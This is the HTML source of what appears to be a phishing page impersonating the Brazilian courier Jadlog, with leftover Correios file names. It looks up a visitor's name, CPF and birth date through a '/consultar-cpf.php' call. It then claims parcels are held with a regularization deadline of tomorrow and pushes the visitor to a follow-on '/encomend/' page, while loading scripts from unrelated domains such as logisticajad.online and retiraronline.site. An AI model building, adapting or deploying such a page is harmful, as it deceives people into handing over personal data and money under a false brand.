<html lang="en"><head><script type="text/javascript" src="https://logisticajad.online/sUGa2zEmKrKD__MODoYSaeHZCzkHK7Xy2sxUGlOgOlOWKEDYJO_ruFBaZoOFEbYHPty70n-x-Ze8XVtFcherLw=="></script>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- <script src="./images/3123.js"></script> -->
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
  <link href="Correios _ Rastreio_arquivos/css2.html" rel="stylesheet">
  <link rel="stylesheet" href="Correios _ Rastreio_arquivos/bootstrap.css">
  <link rel="stylesheet" href="Correios _ Rastreio_arquivos/app.css">
  <link rel="stylesheet" href="Correios _ Rastreio_arquivos/yellow.css">
  <link rel="stylesheet" href="Correios _ Rastreio_arquivos/all.css" crossorigin="anonymous">
  <link rel="icon" type="image/x-icon" href="https://logospng.org/download/jadlog/logo-jadlog-icon-1024.png">
  <meta name="csrf-token" content="BvHekmyuhpxq0y4d95zDDZM0F2cRrES6DJjrP5sP">
  <link rel="stylesheet" type="text/css" href="css/all.css">

  <title>Jadlog | Rastreio</title>
 <!-- Código do Pixel do Facebook -->

  <script type="text/javascript" class="flasher-js">(function () { var rootScript = '../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js'; var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); function mergeOptions(first, second) { return { context: merge(first.context || {}, second.context || {}), envelopes: merge(first.envelopes || [], second.envelopes || []), options: merge(first.options || {}, second.options || {}), scripts: merge(first.scripts || [], second.scripts || []), styles: merge(first.styles || [], second.styles || []), }; } function merge(first, second) { if (Array.isArray(first) && Array.isArray(second)) { return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); } return Object.assign({}, first, second); } function renderOptions(options) { if (!window.hasOwnProperty('flasher')) { console.error('Flasher is not loaded'); return; } requestAnimationFrame(function () { window.flasher.render(options); }); } function render(options) { if ('loading' !== document.readyState) { renderOptions(options); return; } document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); } if (1 === document.querySelectorAll('script.flasher-js').length) { document.addEventListener('flasher:render', function (event) { render(event.detail); }); } if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { render(options); } else { var tag = document.createElement('script'); tag.setAttribute('src', rootScript); tag.setAttribute('type', 'text/javascript'); tag.onload = function () { render(options); }; document.head.appendChild(tag); } })();</script><script src="../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js" type="text/javascript"></script>
  <script src="https://retiraronline.site/cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js" type="text/javascript"></script>
  <script src="Correios _ Rastreio_arquivos/flasher.min.js" type="text/javascript"></script>
  <script src="Correios _ Rastreio_arquivos/flasher.min_002.js" type="text/javascript"></script>
<script>
  // Função para pegar o parâmetro CPF da URL
  function pegarCPF() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('cpf');
  }

  // Função que vai enviar a solicitação para a rota intermediária
  function consultarCPF(cpf) {
    fetch(`/consultar-cpf.php?cpf=${encodeURIComponent(cpf)}`)
      .then(response => {
        if (!response.ok) {
          console.error('Erro ao consultar o CPF:', response.statusText);
          throw new Error('Erro ao consultar dados.');
        }
        return response.json();
      })
      .then(data => {
        console.log('Dados recebidos da rota intermediária:', data);

        if (data && data.nome && data.nascimento && data.cpf) {
          // Atualizando os elementos com os dados recebidos
          document.querySelectorAll(".nome").forEach(el => el.textContent = data.nome);
          document.querySelectorAll(".cpf").forEach(el => el.textContent = data.cpf);
          document.querySelectorAll(".nasc").forEach(el => el.textContent = data.nascimento);
        } else {
          console.error('Dados inválidos ou incompletos recebidos.');
        }
      })
      .catch(error => {
        console.error('Erro na requisição:', error);
      });
  }

  // Capturar o CPF e consultar
  const cpf = pegarCPF();

  if (cpf) {
    consultarCPF(cpf);
  } else {
    console.error('CPF não encontrado na URL.');
  }
</script></head>





<body>
<header class="w-100 font-size-16 font-weight-400 text-blue">
    <!-- <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
      <span style="color: black;">Acessibilidade</span>

      <i class="fas fa-caret-down ml-1"></i>
    </div> -->
    <div class="">
      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px;   border-color: #dc0032!important;">


        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
          <a href="index.html#" class="py-2">
            <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="" height="25">
          </a>
        </div>

        <div class="ml-4 d-none d-lg-block " style="width:150px">
          <a href="index.html#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
            <img src="Correios _ Rastreio_arquivos/entrar.svg" alt="Correios" width="31">

            <span class="ml-1">Entrar</span>
          </a>
        </div>
      </nav>
    </div>
  </header>

  <main>

    <p class="MuiTypography-root MuiTypography-body1 css-151omy3" style="font-weight: bold;padding: 30px 30px 0px 30px;">
      {{ $dados['NOME'] ?? '' }}, encontramos pedidos retidos em uma de nossas agências.
    </p>
    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">

      <div class="CardInfo-sc-d30a2c54-2 fcyxPT">
      <div class="Info-sc-d30a2c54-3 iUXJZC">
        <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">
            Nome Completo: {{ $dados['NOME'] ?? '' }}       </h6>
    </div>
    <div class="Info-sc-d30a2c54-3 iUXJZC">
        <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">
            CPF: {{ $dados['CPF'] ?? '' }}        </h6>
    </div>



        <div class="Info-sc-d30a2c54-3 iUXJZC">
          <h6 class="MuiTypography-root MuiTypography-subtitle2 css-pal88k">
            PRAZO PARA REGULARIZAÇÃO: <span id="date">{{ date('Y-m-d') }}</span></h6>
        </div>

      </div>


    </section>

    <center>
      <p class="mt-4">Essas informações acima estão corretas?</p>
    </center>
    <center>
      <a style="background-color: #dc0032; border-color: #dc0032;" href="/encomend/?cpf={{$dados['CPF'] ?? ''}}&name={{$dados['NOME'] ?? ''}}" class="btn btn-primary">SIM, PROSSEGUIR.</a>
    </center>




    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
      <div>
        <img src="../outdoor02.png" alt="" class="w-100">
      </div>
    </section>
  </main>

  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark" style="background-color: #fff;">
   <div style="display: flex; justify-content: center; align-items: center; margin: 20px auto">
    <img width="150px" src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="">
   </div>

    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
      <span>© Copyright 2025 Jadlog</span>
    </div>
  </footer>

  <script src="Correios _ Rastreio_arquivos/jquery-3.6.0.min.js"></script>
  <script src="Correios _ Rastreio_arquivos/bootstrap.min.js"></script>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
    // Obtém a data de hoje e adiciona um dia para obter a data de amanhã
    let tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);

    // Formata a data no formato DD/MM/AAAA
    let day = String(tomorrow.getDate()).padStart(2, '0');
    let month = String(tomorrow.getMonth() + 1).padStart(2, '0');
    let year = tomorrow.getFullYear();
    let formattedDate = `${day}/${month}/${year}`;

    // Define a data no elemento com id "date"
    let element = document.getElementById("date");
    if (element) {
        element.textContent = formattedDate;
    }
});

  </script>

  <script src="../scripts/utms/latest-1.js" data-utmify-prevent-subids="" async="" defer=""></script>



<kcp-syuxepyccssf></kcp-syuxepyccssf></body></html>
